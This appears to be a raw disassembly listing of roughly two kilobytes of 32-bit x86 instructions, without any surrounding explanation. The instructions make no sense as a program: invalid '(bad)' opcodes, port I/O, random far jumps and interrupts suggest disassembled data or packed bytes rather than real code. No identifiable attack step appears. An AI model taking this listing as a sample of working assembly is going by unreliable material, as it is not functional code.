  41f172:	or     DWORD PTR ds:0xa7a2b87,0x49
  41f179:	arpl   WORD PTR [eax+0xaff6892],bx
  41f17f:	inc    esp
  41f180:	cmp    dl,BYTE PTR [ebx-0x27]
  41f183:	xchg   ebx,eax
  41f184:	xchg   esi,eax
  41f185:	push   ecx
  41f186:	add    eax,0xd975eeb6
  41f18b:	push   ecx
  41f18c:	fwait
  41f18d:	loopne 0x41f1f2
  41f18f:	enter  0x9f0a,0xf6
  41f193:	nop
  41f194:	(bad)  
  41f195:	xor    ebp,DWORD PTR [ebp+ebp*1-0x1f]
  41f199:	cmp    DWORD PTR [ebp+0x3a366fe8],eax
  41f19f:	xchg   ebx,eax
  41f1a0:	in     al,0x4a
  41f1a2:	call   0x8446:0xfef61142
  41f1a9:	and    al,0xb7
  41f1ab:	sub    BYTE PTR [eax-0x5842f9f7],0x51
  41f1b2:	jp     0x41f214
  41f1b4:	cs je  0x41f153
  41f1b7:	adc    cl,0x8
  41f1ba:	push   es
  41f1bb:	out    dx,eax
  41f1bc:	(bad)  
  41f1bd:	mov    edi,0x14208ea0
  41f1c2:	sbb    al,0x91
  41f1c4:	mov    al,BYTE PTR [eax-0x68cf69a4]
  41f1ca:	or     al,0x38
  41f1cc:	jge    0x41f159
  41f1ce:	xchg   BYTE PTR [ecx+0x2228e743],bh
  41f1d4:	ret    0xff3f
  41f1d7:	in     al,dx
  41f1d8:	fadd   DWORD PTR [edi-0x69]
  41f1db:	cmp    ebp,DWORD PTR [eax+0x64]
  41f1de:	dec    eax
  41f1df:	push   ss
  41f1e0:	sub    dh,bl
  41f1e2:	(bad)  
  41f1e3:	into   
  41f1e4:	adc    cl,dl
  41f1e6:	xor    BYTE PTR [esp+eax*1+0x64],dl
  41f1ea:	push   0x96af0d1d
  41f1ef:	shl    al,1
  41f1f1:	retf   0xef5a
  41f1f4:	and    esp,0xffffff93
  41f1f7:	xchg   esi,eax
  41f1f8:	xlat   BYTE PTR ds:[ebx]
  41f1f9:	mov    esi,DWORD PTR [ebx]
  41f1fb:	ss loope 0x41f21f
  41f1fe:	pop    fs
  41f200:	pop    ss
  41f201:	add    edx,esp
  41f203:	mov    ecx,0xc81b30ac
  41f208:	pop    ecx
  41f209:	add    al,0xeb
  41f20b:	pusha  
  41f20c:	mov    DWORD PTR [ebp-0x37],esp
  41f20f:	mov    BYTE PTR [ecx],bh
  41f211:	xchg   ecx,eax
  41f212:	jmp    0x441c29e3
  41f217:	loope  0x41f1bc
  41f219:	add    cl,BYTE PTR [ecx]
  41f21b:	mov    eax,0x3a3527d9
  41f220:	jp     0x41f28a
  41f222:	xor    dl,BYTE PTR [ebx+edi*4-0x8]
  41f226:	dec    edi
  41f227:	adc    DWORD PTR [esi+0x31d9ef14],edx
  41f22d:	call   0x70132066
  41f232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f233:	out    0x72,eax
  41f235:	dec    edx
  41f236:	dec    ebp
  41f238:	out    0x9b,al
  41f23a:	jl     0x41f1e3
  41f23c:	mov    esp,0x92ac7c9e
  41f241:	and    BYTE PTR [eax-0x25],dh
  41f244:	arpl   WORD PTR [ecx-0x2d],ax
  41f247:	cli    
  41f248:	pop    edi
  41f249:	cmp    esp,edi
  41f24b:	jo     0x41f251
  41f24d:	and    eax,0x82ec8be2
  41f252:	cmp    DWORD PTR [edi-0x57d4a457],0x33
  41f259:	imul   edi
  41f25b:	mov    al,BYTE PTR [esi+0x39]
  41f25e:	push   esp
  41f25f:	sub    DWORD PTR [esp-0x74647da3],edx
  41f266:	mov    ds:0xea0d80b2,al
  41f26b:	out    dx,al
  41f26c:	dec    esp
  41f26d:	fs fwait
  41f26f:	push   edx
  41f270:	push   ebp
  41f271:	inc    ebp
  41f272:	jbe    0x41f29e
  41f274:	xor    DWORD PTR [esi-0x16dce6e5],esi
  41f27a:	int    0x2f
  41f27c:	enter  0x8d88,0x65
  41f280:	arpl   WORD PTR [ecx+0x4eda9715],di
  41f286:	sub    ch,cl
  41f288:	inc    ebx
  41f289:	out    0xdd,al
  41f28b:	or     BYTE PTR [ebx+0x39],dh
  41f28e:	dec    ebp
  41f28f:	mov    esp,0x9f94fd18
  41f294:	(bad)  
  41f295:	(bad)  
  41f296:	aad    0x7e
  41f298:	sub    BYTE PTR [esi],al
  41f29a:	cmp    ebp,DWORD PTR [ebp-0x3a]
  41f29d:	ror    BYTE PTR ss:[edi-0x4aefa183],0x2d
  41f2a5:	das    
  41f2a6:	in     eax,dx
  41f2a7:	push   edx
  41f2a8:	mov    eax,ds:0x878243bb
  41f2ad:	shl    DWORD PTR [eax+0x46fc8e5f],cl
  41f2b3:	jno    0x41f2e5
  41f2b5:	cs xor eax,0xc52b295d
  41f2bb:	pushf  
  41f2bc:	(bad)  
  41f2bd:	jo     0x41f309
  41f2bf:	xor    eax,0x7d9eaf14
  41f2c4:	mov    ebp,0xbc902a6
  41f2c9:	sbb    al,bh
  41f2cb:	(bad)  
  41f2cc:	in     al,0xbb
  41f2ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2cf:	inc    ecx
  41f2d0:	test   DWORD PTR [eax],ebp
  41f2d2:	fadd   st,st(4)
  41f2d4:	popa   
  41f2d5:	addr16 and al,0x64
  41f2d8:	pop    ebp
  41f2d9:	sbb    dl,0x2b
  41f2dc:	add    eax,0x561f468b
  41f2e1:	aad    0xda
  41f2e3:	ds ret 
  41f2e5:	xor    eax,DWORD PTR [ecx-0xcd441a]
  41f2eb:	dec    edi
  41f2ec:	cmp    esp,edx
  41f2ee:	cmp    esp,DWORD PTR [eax-0x30]
  41f2f1:	sub    eax,0xe0deb53f
  41f2f6:	and    DWORD PTR [ecx+0x3e],edi
  41f2f9:	popf   
  41f2fa:	xchg   edx,eax
  41f2fb:	aam    0xac
  41f2fd:	jl     0x41f2fb
  41f2ff:	mov    ecx,0x61fcc4d7
  41f304:	jnp    0x41f2c8
  41f306:	jg     0x41f336
  41f308:	or     DWORD PTR [edi+0x5d],eax
  41f30b:	mov    ah,0xfd
  41f30d:	and    al,0xe6
  41f30f:	and    eax,edi
  41f311:	mov    ebx,0xb3c6e49a
  41f316:	xchg   esp,eax
  41f317:	std    
  41f318:	fmul   QWORD PTR [ecx]
  41f31a:	jg     0x41f37e
  41f31c:	add    cl,bl
  41f31e:	test   BYTE PTR [esi+ecx*4-0x464d616e],0x46
  41f326:	sbb    DWORD PTR [ebx-0x66],esp
  41f329:	mov    BYTE PTR ds:[ebp+0xc9ddb8d],al
  41f330:	std    
  41f331:	or     ch,BYTE PTR [edi-0x30bed492]
  41f337:	inc    edi
  41f338:	xchg   DWORD PTR [ebx+0x33],ecx
  41f33b:	aas    
  41f33c:	sbb    edx,DWORD PTR [edi]
  41f33e:	into   
  41f33f:	sti    
  41f340:	arpl   WORD PTR [ecx+0x45],bx
  41f343:	sbb    BYTE PTR [ebx+0xbc3e948],al
  41f349:	xchg   ebp,eax
  41f34a:	and    bl,BYTE PTR [ebx-0x2c615ba0]
  41f350:	add    bh,BYTE PTR [esi+0x35]
  41f353:	sub    ah,cl
  41f355:	js     0x41f32d
  41f357:	imul   ebx,DWORD PTR [edx+0x7e414865],0xade532c1
  41f361:	in     al,0x1f
  41f363:	adc    DWORD PTR [esi-0x42],ebp
  41f366:	adc    DWORD PTR [ebx],ebp
  41f368:	jge    0x41f36c
  41f36a:	loope  0x41f37a
  41f36c:	cmp    BYTE PTR [esi+0x3f],0xb9
  41f370:	jmp    0x39d7:0x934e7b5
  41f377:	scas   al,BYTE PTR es:[edi]
  41f378:	pop    edi
  41f379:	cwde   
  41f37a:	mov    eax,0xd115357b
  41f37f:	out    0x75,al
  41f381:	jae    0x41f3e1
  41f383:	push   cs
  41f384:	scas   eax,DWORD PTR es:[edi]
  41f385:	imul   ecx,esp,0x13da67b6
  41f38b:	mov    DWORD PTR [ebp+edx*4-0x7d],eax
  41f38f:	fsub   QWORD PTR [edx]
  41f391:	imul   eax,esp,0xffffffbc
  41f394:	mov    ds:0xc3d9701f,al
  41f399:	and    eax,0xcc452971
  41f39e:	inc    eax
  41f39f:	jns    0x41f35b
  41f3a1:	ror    BYTE PTR [ebp+ecx*1-0x5c6aeabb],0xd5
  41f3a9:	fs jg  0x41f393
  41f3ac:	push   DWORD PTR [ecx-0x6d3750e2]
  41f3b2:	lahf   
  41f3b3:	out    0x1d,al
  41f3b5:	jecxz  0x41f3c1
  41f3b7:	sti    
  41f3b8:	test   al,0x71
  41f3ba:	cmp    eax,0x58252a2
  41f3bf:	in     eax,0xc3
  41f3c1:	outs   dx,BYTE PTR ds:[esi]
  41f3c2:	aaa    
  41f3c3:	and    DWORD PTR [eax+esi*2],esi
  41f3c6:	cli    
  41f3c7:	data16 aaa 
  41f3c9:	xor    BYTE PTR ds:0xa6c02fbf,dl
  41f3cf:	xor    dl,bh
  41f3d1:	pop    ebp
  41f3d2:	aam    0x6d
  41f3d4:	cmp    BYTE PTR [edi+0x37],bh
  41f3d7:	hlt    
  41f3d8:	mov    DWORD PTR [esi+edx*8+0x1e06ab08],edi
  41f3df:	iret   
  41f3e0:	pusha  
  41f3e1:	and    eax,0x7c21b24d
  41f3e6:	scas   al,BYTE PTR es:[edi]
  41f3e7:	rcl    DWORD PTR [esi],cl
  41f3e9:	je     0x41f3b2
  41f3eb:	stc    
  41f3ec:	mov    al,ds:0x3986789e
  41f3f1:	jno    0x41f375
  41f3f3:	dec    edx
  41f3f4:	stos   BYTE PTR es:[edi],al
  41f3f5:	jge    0x41f43a
  41f3f7:	rol    esp,0x16
  41f3fa:	xchg   ebp,eax
  41f3fb:	mov    ds:0xca9e8939,al
  41f400:	mov    ds:0x805bb0f5,al
  41f405:	ins    DWORD PTR es:[edi],dx
  41f406:	out    0xa2,eax
  41f408:	pusha  
  41f409:	fcmovne st,st(0)
  41f40b:	jl     0x41f3a5
  41f40d:	dec    edx
  41f40e:	push   ebp
  41f40f:	je     0x41f409
  41f411:	rcl    ecx,1
  41f413:	lods   eax,DWORD PTR ds:[esi]
  41f414:	sbb    ecx,DWORD PTR [esi+edx*8]
  41f417:	mov    bl,0x10
  41f419:	xor    edi,ebx
  41f41b:	fwait
  41f41c:	sbb    DWORD PTR [ecx-0x7b],esi
  41f41f:	jp     0x41f3bc
  41f421:	cmp    eax,0x9cb9fe96
  41f426:	push   eax
  41f427:	and    BYTE PTR es:[ebp+eax*1+0x73],al
  41f42c:	adc    edx,0xf7f0ae0
  41f432:	loopne 0x41f49a
  41f434:	mov    ss,esp
  41f436:	mov    ebx,0x6cbbf3e4
  41f43b:	ror    DWORD PTR [esi-0x11],0x43
  41f43f:	aas    
  41f440:	lds    eax,FWORD PTR [esi-0x45]
  41f443:	sbb    ecx,esp
  41f445:	cdq    
  41f446:	mov    ds:0xb3fe3d73,eax
  41f44b:	imul   eax,DWORD PTR ds:0x6ce4bb99,0xdf7490a5
  41f455:	sub    ch,ah
  41f457:	add    cl,al
  41f459:	dec    ecx
  41f45a:	push   esp
  41f45b:	and    esp,DWORD PTR [ebx]
  41f45d:	inc    ebx
  41f45e:	mov    al,ds:0xb6140f34
  41f463:	sbb    bl,BYTE PTR ss:[ebx-0x6]
  41f467:	mov    dh,0xe2
  41f469:	jmp    0x95c534af
  41f46e:	sbb    cl,BYTE PTR [edi]
  41f470:	jmp    0x41f497
  41f472:	mov    DWORD PTR [eax],eax
  41f474:	dec    ebp
  41f475:	mov    ebx,DWORD PTR [esi-0x27f67ae0]
  41f47b:	push   ebx
  41f47c:	pop    ebp
  41f47d:	cmp    ah,BYTE PTR [esi-0x7027970e]
  41f483:	inc    edx
  41f484:	adc    al,0x1c
  41f486:	adc    DWORD PTR [edx+0x3ded8378],0xffffffe0
  41f48d:	out    0xb,al
  41f48f:	mul    BYTE PTR [edi-0x2b]
  41f492:	(bad)  
  41f494:	nop
  41f495:	xchg   edi,eax
  41f496:	cmp    eax,0x39bae762
  41f49b:	pcmpeqd mm5,QWORD PTR [edi-0x65b75293]
  41f4a2:	xor    bl,ah
  41f4a4:	ins    BYTE PTR es:[edi],dx
  41f4a5:	mov    ds:0xc438479c,eax
  41f4aa:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41f4ac:	push   es
  41f4ad:	cld    
  41f4ae:	nop
  41f4af:	mov    eax,ds:0x239c425f
  41f4b4:	mov    ecx,0x194e3706
  41f4b9:	dec    eax
  41f4ba:	fwait
  41f4bb:	imul   eax,DWORD PTR [ebp+0x46],0xdadaa053
  41f4c2:	leave  
  41f4c3:	mov    edi,0x3755091b
  41f4c8:	ins    BYTE PTR es:[edi],dx
  41f4c9:	std    
  41f4ca:	jp     0x41f493
  41f4cc:	dec    edx
  41f4cd:	push   ebx
  41f4ce:	loop   0x41f4f0
  41f4d0:	bnd jmp 0x4e97687d
  41f4d6:	fwait
  41f4d7:	jns    0x41f490
  41f4d9:	cmp    ebp,ebx
  41f4db:	int    0x73
  41f4dd:	int    0x9
  41f4df:	int    0x1c
  41f4e1:	mov    ecx,0x28ceeb73
  41f4e6:	lds    ebp,FWORD PTR [esi]
  41f4e8:	mov    bl,0x8d
  41f4ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4eb:	sub    bh,BYTE PTR [ecx+0x511681e4]
  41f4f1:	cmp    DWORD PTR [edx+ebp*1-0x423c597c],esi
  41f4f8:	adc    al,0xb9
  41f4fa:	(bad)  
  41f4fb:	adc    BYTE PTR [ecx+0x8],bh
  41f4fe:	pop    edx
  41f4ff:	stc    
  41f500:	arpl   bx,ax
  41f502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f503:	retf   
  41f504:	lods   eax,DWORD PTR ds:[esi]
  41f505:	inc    esi
  41f506:	outs   dx,DWORD PTR ds:[esi]
  41f507:	or     al,0xba
  41f509:	add    ah,bh
  41f50b:	xchg   ebp,eax
  41f50c:	xchg   edx,eax
  41f50d:	mov    ds:0xdbafcd8,al
  41f512:	sub    BYTE PTR [edi+0x3],bh
  41f515:	add    ah,BYTE PTR [esi]
  41f517:	cs (bad) 
  41f519:	pop    eax
  41f51a:	je     0x41f570
  41f51c:	mov    es,WORD PTR [ebp-0x7e92165a]
  41f522:	push   ds
  41f523:	test   edi,edx
  41f525:	push   0x8a263f05
  41f52a:	cmp    dl,dl
  41f52c:	iret   
  41f52d:	sbb    BYTE PTR [esi],0x93
  41f530:	mov    esi,0xa6fb729b
  41f535:	mov    BYTE PTR [ebp+0x68661cc],bh
  41f53b:	sbb    ah,al
  41f53d:	fadd   st,st(6)
  41f53f:	xor    bh,BYTE PTR [edi]
  41f541:	bound  esi,QWORD PTR [edx+0x49]
  41f544:	dec    eax
  41f545:	fwait
  41f546:	mov    bh,0x56
  41f548:	push   eax
  41f549:	adc    esi,DWORD PTR [edx+0x70]
  41f54c:	push   eax
  41f54d:	mov    dh,0xe8
  41f54f:	cld    
  41f550:	ds cli 
  41f552:	push   ebp
  41f553:	mov    al,ch
  41f555:	imul   esi,DWORD PTR [edi-0x2d334f10],0xfffffff5
  41f55c:	mov    edi,DWORD PTR [edi-0x5d]
  41f55f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f560:	sub    edi,DWORD PTR [ebp+0xb]
  41f563:	ins    DWORD PTR es:[edi],dx
  41f564:	add    cl,BYTE PTR [eax-0x20a3e560]
  41f56a:	mov    dh,0x19
  41f56c:	rcr    BYTE PTR [eax+edi*8+0x2e],cl
  41f570:	int    0xc4
  41f572:	aad    0xec
  41f574:	(bad)  
  41f575:	jp     0x41f5a7
  41f577:	fs mov cl,0x35
  41f57a:	jp     0x41f590
  41f57c:	or     al,0x9e
  41f57e:	sti    
  41f57f:	test   BYTE PTR [esp+ecx*1],bh
  41f582:	mov    eax,0xbde92fa9
  41f587:	mov    ah,0x67
  41f589:	aaa    
  41f58a:	ret    
  41f58b:	imul   ebp,eax,0x63
  41f58e:	mov    es,WORD PTR [edi-0x31b1bb43]
  41f594:	dec    ebp
  41f595:	(bad)  
  41f596:	loopne 0x41f576
  41f598:	lahf   
  41f599:	jmp    edi
  41f59b:	push   esi
  41f59c:	and    edx,DWORD PTR [edx]
  41f59e:	repnz ss xchg esp,eax
  41f5a1:	frstor [edi-0x3f4e92e9]
  41f5a7:	xor    eax,0x231fa94b
  41f5ac:	xor    esi,esi
  41f5ae:	imul   ebp,esi,0xf066fd5e
  41f5b4:	jmp    0x174f:0x6b1a20cc
  41f5bb:	test   DWORD PTR [edi],ebp
  41f5bd:	mov    ebx,0x34d5dd1d
  41f5c2:	mov    ecx,0xa839f587
  41f5c7:	xchg   edx,eax
  41f5c8:	test   ecx,0xafc011d3
  41f5ce:	scas   al,BYTE PTR es:[edi]
  41f5cf:	aad    0xef
  41f5d1:	or     ebx,DWORD PTR [ecx]
  41f5d3:	dec    edx
  41f5d4:	pop    ebp
  41f5d5:	cwde   
  41f5d6:	sbb    BYTE PTR [esi],ah
  41f5d8:	jmp    0x43cd:0x5cbe2988
  41f5df:	xor    DWORD PTR [eax+0x45],edi
  41f5e2:	pop    ebp
  41f5e3:	sub    eax,0x16f6d85
  41f5e8:	mov    esi,0x8e3f5262
  41f5ed:	(bad)  
  41f5ee:	in     al,dx
  41f5ef:	test   bl,cl
  41f5f1:	mov    edi,0xf41081a3
  41f5f6:	das    
  41f5f7:	lea    edx,[eax+0x19eb921e]
  41f5fd:	dec    esi
  41f5fe:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f600:	jmp    0x41e5:0xead27370
  41f607:	xchg   edi,eax
  41f608:	push   0x42a3e6a4
  41f60d:	mov    WORD PTR [edx-0x7a],ds
  41f610:	adc    BYTE PTR [ebp-0x53],ah
  41f613:	dec    ecx
  41f614:	jmp    0x41f5a9
  41f616:	pop    ds
  41f617:	push   ebx
  41f618:	inc    edi
  41f619:	push   ss
  41f61a:	in     eax,0x3b
  41f61c:	mov    dl,0x2c
  41f61e:	loope  0x41f662
  41f620:	(bad)  
  41f621:	jo     0x41f614
  41f623:	mov    edi,0x15217b32
  41f628:	push   ebp
  41f629:	addr16 ret 0xd3df
  41f62d:	inc    ebp
  41f62e:	and    dl,bl
  41f630:	scas   al,BYTE PTR es:[edi]
  41f631:	fisttp DWORD PTR [eax+ebp*1-0x26]
  41f635:	xor    eax,0xb8a87d58
  41f63a:	dec    edx
  41f63b:	add    ah,BYTE PTR [ebx]
  41f63d:	hlt    
  41f63e:	cmp    DWORD PTR [eax],eax
  41f640:	mov    esp,DWORD PTR [ebx-0x75776f42]
  41f646:	sub    ah,0xac
  41f649:	ins    BYTE PTR es:[edi],dx
  41f64a:	not    DWORD PTR [ebp+0x3e]
  41f64d:	push   ecx
  41f64e:	pop    edi
  41f64f:	in     eax,0x8e
  41f651:	xor    BYTE PTR [ecx-0x33],0xd0
  41f655:	mov    eax,ds:0xb781c860
  41f65a:	(bad)  
  41f65c:	cmc    
  41f65d:	imul   edx,DWORD PTR [eax+ebx*8-0xf776253],0x6d926099
  41f668:	inc    eax
  41f669:	cmc    
  41f66a:	pop    eax
  41f66b:	(bad)  
  41f66c:	cs js  0x41f679
  41f66f:	mov    eax,0xe9f7834e
  41f674:	bound  esi,QWORD PTR [edi+0x11fd4b24]
  41f67a:	cmc    
  41f67b:	leave  
  41f67c:	ret    0xb71c
  41f67f:	test   eax,0xce5617d9
  41f684:	xlat   BYTE PTR ds:[ebx]
  41f685:	nop
  41f686:	jmp    0xebf0:0xb5e8e971
  41f68d:	mov    dh,0x2e
  41f68f:	mov    DWORD PTR [edi-0x19],ecx
  41f692:	dec    esi
  41f693:	add    al,0x36
  41f695:	enter  0x9c0c,0xa6
  41f699:	cmp    bh,ah
  41f69b:	jne    0x41f6b1
  41f69d:	loope  0x41f689
  41f69f:	fbld   TBYTE PTR [esp+edi*8]
  41f6a2:	psubd  mm1,QWORD PTR [esi-0x3]
  41f6a6:	sub    DWORD PTR [edx],esp
  41f6a8:	sahf   
  41f6a9:	jne    0x41f63c
  41f6ab:	xor    BYTE PTR [ebx],bl
  41f6ad:	adc    ecx,esp
  41f6af:	xor    BYTE PTR ds:[eax],dh
  41f6b2:	push   0x31
  41f6b4:	int    0xda
  41f6b6:	push   edi
  41f6b7:	and    al,0x2
  41f6b9:	sbb    BYTE PTR [ebp-0x4bbdba14],0xb9
  41f6c0:	je     0x41f73b
  41f6c2:	rcr    DWORD PTR [eax+0x5832239a],cl
  41f6c8:	jmp    0x41f727
  41f6ca:	data16 or al,BYTE PTR [esi-0x5146ba1c]
  41f6d1:	in     al,dx
  41f6d2:	mov    es,WORD PTR [esi+0x63146c00]
  41f6d8:	pushf  
  41f6d9:	push   ds
  41f6da:	cmp    ah,BYTE PTR [edi+0x33]
  41f6dd:	arpl   cx,cx
  41f6df:	test   BYTE PTR [edi+ebx*8-0x746d18a1],cl
  41f6e6:	std    
  41f6e7:	adc    eax,0x3875debb
  41f6ec:	xor    DWORD PTR [ebx-0x5ac404ae],0x76
  41f6f3:	push   ebp
  41f6f4:	ret    
  41f6f5:	mov    ebx,esi
  41f6f7:	int    0x33
  41f6f9:	outs   dx,DWORD PTR ds:[esi]
  41f6fa:	call   0xcae5f896
  41f6ff:	mov    WORD PTR [ecx],?
  41f701:	mov    eax,ds:0x8846541d
  41f706:	nop
  41f707:	sub    al,0x34
  41f709:	ds ins DWORD PTR es:[edi],dx
  41f70b:	or     eax,0xb99ce8a9
  41f710:	pop    ss
  41f711:	mov    ebx,0x5bc97c2d
  41f716:	jge    0x41f753
  41f718:	xor    DWORD PTR [esi+0x218c04e0],esi
  41f71e:	repz fisttp QWORD PTR [esi]
  41f721:	rol    BYTE PTR [ecx],1
  41f723:	into   
  41f724:	cwde   
  41f725:	push   ebp
  41f726:	in     eax,dx
  41f727:	jns    0x41f739
  41f729:	jbe    0x41f77d
  41f72b:	es std 
  41f72d:	mov    cl,0x54
  41f72f:	jmp    0x41f70c
  41f731:	outs   dx,BYTE PTR ds:[esi]
  41f732:	adc    dh,BYTE PTR [eax]
  41f734:	pop    edi
  41f735:	dec    ecx
  41f736:	mov    dl,0x79
  41f738:	mov    edx,DWORD PTR [eax-0x282b6d2b]
  41f73e:	jp     0x41f70a
  41f740:	call   DWORD PTR [ecx]
  41f742:	xor    DWORD PTR [esi],esi
  41f744:	jg     0x41f745
  41f746:	(bad)  [ebx-0x65ffcef6]
  41f74c:	push   eax
  41f74d:	mov    edx,0x251bad97
  41f752:	dec    esp
  41f753:	ins    BYTE PTR es:[edi],dx
  41f754:	imul   edx,DWORD PTR [edi],0xffffffe6
  41f757:	push   ebp
  41f758:	push   ss
  41f759:	lahf   
  41f75a:	lock push ss
  41f75c:	(bad)  
  41f75d:	retf   
  41f75e:	(bad)  
  41f75f:	mov    esi,0x7d2d7fd0
  41f764:	xchg   edi,eax
  41f765:	or     DWORD PTR [ebx+0x2a],edi
  41f768:	fbstp  TBYTE PTR [ebx-0x2818132]
  41f76e:	xchg   ecx,eax
  41f76f:	xchg   DWORD PTR [edi-0x2f],ecx
  41f772:	cs adc eax,0xb679e1a9
  41f778:	mov    ecx,0xdfb88a2c
  41f77d:	fcomp  st(1)
  41f77f:	call   0xab6f:0x8cb9b917
  41f786:	sti    
  41f787:	push   cs
  41f788:	adc    al,bl
  41f78a:	stos   BYTE PTR es:[edi],al
  41f78b:	mov    edx,0x3d91400f
  41f790:	dec    edx
  41f791:	ins    BYTE PTR es:[edi],dx
  41f792:	jge    0x41f7ae
  41f794:	mov    esi,0x819e7a26
  41f799:	push   ds
  41f79a:	das    
  41f79b:	ins    BYTE PTR es:[edi],dx
  41f79c:	jns    0x41f72a
  41f79e:	sub    ebx,DWORD PTR [eax]
  41f7a0:	add    eax,0x74b796e2
  41f7a5:	mov    eax,ds:0x41bf4dde
  41f7ab:	fistp  DWORD PTR [eax]
  41f7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7ae:	jo     0x41f7f8
  41f7b0:	inc    edx
  41f7b1:	add    al,0x34
  41f7b3:	inc    ebx
  41f7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7b5:	jbe    0x41f7e7
  41f7b7:	ret    0x25a
  41f7ba:	std    
  41f7bb:	pop    ebp
  41f7bc:	in     al,0xbf
  41f7be:	jbe    0x41f7b9
  41f7c0:	xchg   ecx,eax
  41f7c1:	add    esp,DWORD PTR [ebx+0x79]
  41f7c4:	fisubr WORD PTR [ebx]
  41f7c6:	inc    ebp
  41f7c7:	rol    DWORD PTR [edi-0x6186e8eb],1
  41f7cd:	mov    dl,0x35
  41f7cf:	or     BYTE PTR [edx+edi*4-0x600bf8c8],ah
  41f7d6:	mov    ebp,0x7d923111
  41f7db:	div    DWORD PTR [eax-0x2f]
  41f7de:	jno    0x41f83f
  41f7e0:	outs   dx,BYTE PTR ds:[esi]
  41f7e1:	push   ebp
  41f7e2:	lahf   
  41f7e3:	clc    
  41f7e4:	sbb    al,0xda
  41f7e6:	div    BYTE PTR [ecx+0x2e]
  41f7e9:	ret    0x8933
  41f7ec:	mov    al,ds:0x423d7af5
  41f7f1:	(bad)  [ebx+0x48]
  41f7f4:	push   edx
  41f7f5:	repz sub BYTE PTR [ebp-0x490cb7d9],al
  41f7fc:	rol    BYTE PTR [ebp+0xfac2740],cl
  41f802:	repnz sbb BYTE PTR [ecx+0x43],ah
  41f806:	push   0x47
  41f808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f809:	cmp    ecx,DWORD PTR [eax+0x68]
  41f80c:	call   0x6609:0x594b671b
  41f813:	aaa    
  41f814:	inc    ebp
  41f815:	sub    eax,0xd0f4e404
  41f81a:	lods   eax,DWORD PTR ds:[esi]
  41f81b:	push   di
  41f81d:	mov    eax,ds:0x557dc034
  41f822:	mov    DWORD PTR [esi],ebp
  41f824:	jge    0x41f87b
  41f826:	sub    BYTE PTR [ecx+edx*4+0x71],dh
  41f82a:	push   ss
  41f82b:	mov    ecx,0x53945dd0
  41f830:	dec    edi
  41f831:	aaa    
  41f832:	das    
  41f833:	adc    al,0x76
  41f835:	fwait
  41f836:	sbb    eax,0x5a
  41f839:	arpl   si,bp
  41f83b:	in     al,dx
  41f83c:	lahf   
  41f83d:	aam    0xe4
  41f83f:	mov    eax,edi
  41f841:	cmp    BYTE PTR [esp+esi*4+0x6],0xa3
  41f846:	sub    bl,BYTE PTR [ebp+0x6a03dbb8]
  41f84c:	in     eax,0xdb
  41f84e:	jmp    0xd0d7:0xb866d37f
  41f855:	cmp    bh,bh
  41f857:	pop    ebx
  41f858:	xor    BYTE PTR [ecx+0x498a394a],ah
  41f85e:	add    BYTE PTR [edx+0x6f],ch
  41f861:	jne    0x41f8e1
  41f863:	add    DWORD PTR [esi+0x1e],edi
  41f866:	cmp    BYTE PTR [edi-0x48],bl
  41f869:	lock xchg esi,eax
  41f86b:	gs and al,0x3a
  41f86e:	mov    ?,WORD PTR [ecx]
  41f870:	out    dx,eax
  41f871:	mov    edi,0xf150b2ba
  41f876:	mov    bl,BYTE PTR [ebp+0x5a]
  41f879:	xchg   ecx,eax
  41f87a:	pop    ebx
  41f87b:	test   al,0xca
  41f87d:	and    bh,BYTE PTR [ebp-0x735b9a88]
  41f883:	sahf   
  41f884:	cmc    
  41f885:	sub    ecx,DWORD PTR [eax-0x51]
  41f888:	push   0x5d
  41f88a:	lahf   
  41f88b:	imul   edi,DWORD PTR [eax-0x1d],0x5df221c
  41f892:	int    0x11
  41f894:	cdq    
  41f895:	je     0x41f832
  41f897:	jae    0x41f83f
  41f899:	dec    ecx
  41f89a:	push   cs
  41f89b:	rol    dl,1
  41f89d:	bound  esp,QWORD PTR [ebp+0x2d0ac89e]
  41f8a3:	fadd   DWORD PTR [ebp-0x6f]
  41f8a6:	cmp    al,0xb8
  41f8a8:	mov    esp,0x8115b2e0
  41f8ad:	jp     0x41f8bf
  41f8af:	or     BYTE PTR [ecx-0x70],0x5f
  41f8b3:	mov    ebp,DWORD PTR [ebx+ebp*8]
  41f8b6:	dec    ecx
  41f8b7:	dec    edx
  41f8b8:	sbb    BYTE PTR [ebx],0x84
  41f8bb:	xor    BYTE PTR ds:0x14e6b742,bl
  41f8c1:	dec    bp
  41f8c3:	popa   
  41f8c4:	mov    esp,DWORD PTR [ecx+ebx*2+0x42518fde]
  41f8cb:	cmp    DWORD PTR [edx+0x14d78e6e],eax
  41f8d1:	xlat   BYTE PTR ds:[ebx]
  41f8d2:	mov    dl,0xcc
  41f8d4:	mov    cl,0x8c
  41f8d6:	mov    dh,0xde
  41f8d8:	inc    ebx
  41f8d9:	add    esi,eax
  41f8db:	push   es
  41f8dc:	ret    
  41f8dd:	(bad)
  41f8e0:	jecxz  0x41f864
  41f8e2:	rcr    DWORD PTR [esi-0x321c30a4],0x56
  41f8e9:	pop    edi
  41f8ea:	adc    al,0xaa
  41f8ec:	je     0x41f8c5
  41f8ee:	cdq    
  41f8ef:	adc    ebx,DWORD PTR [edx+0x69]
  41f8f2:	mov    DWORD PTR [edx+0x6c9eeed4],ebx
  41f8f8:	xchg   edi,eax
  41f8f9:	nop
  41f8fa:	fwait
  41f8fb:	repnz (bad) 
  41f8fd:	iret   
  41f8fe:	rcr    ch,0x8f
  41f901:	mov    bh,0x68
  41f903:	add    BYTE PTR [edi+0x4314b99],al
  41f909:	push   ss
  41f90a:	cmp    al,0x4d
  41f90c:	ror    DWORD PTR [edx+0x37],0xad
  41f910:	sahf   
  41f911:	js     0x41f8cb
  41f913:	mov    bh,0x73
  41f915:	xlat   BYTE PTR ds:[ebx]
  41f916:	aaa    
  41f917:	not    BYTE PTR ds:0xa3c5ac4d
  41f91d:	test   al,0xef
  41f91f:	add    ah,BYTE PTR [esi]
  41f921:	mov    BYTE PTR [eax-0x11],bh
